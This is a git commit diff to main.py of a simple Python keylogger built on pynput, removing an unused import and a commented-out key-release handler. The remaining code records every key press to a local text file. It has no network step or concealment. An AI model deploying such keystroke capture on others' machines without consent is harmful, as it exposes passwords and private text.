c2e9cd28e714770d10aeafc6d083c1da52268226
Balaj-dev <mbalajmubeen@gmail.com>
2025-11-20 13:44:14 +0500

    import datetime fix remove

--- main.py
+++ main.py
@@ -1,4 +1,3 @@
-import _datetime as dt
 from pynput import keyboard
 
 with open("logger_result.txt" , "w") as file:
@@ -19,16 +18,6 @@ def pressed(key):
                 file.write('\n')
             if key_pressed == "Key.space":
                 file.write(" ")
-
-# def released(key):
-#     try:
-#         key_pressed = format(key.char)
-#         with open("logger_result.txt", "a") as file:
-#             file.write(f'alphanumeric key {key_pressed} pressed \n')
-#     except:
-#         key_pressed = format(key)
-#         with open("logger_result.txt", "a") as file:
-#             file.write(f'alphanumeric key {key_pressed} pressed \n')
 
 with keyboard.Listener(
     on_press=pressed) as listner:
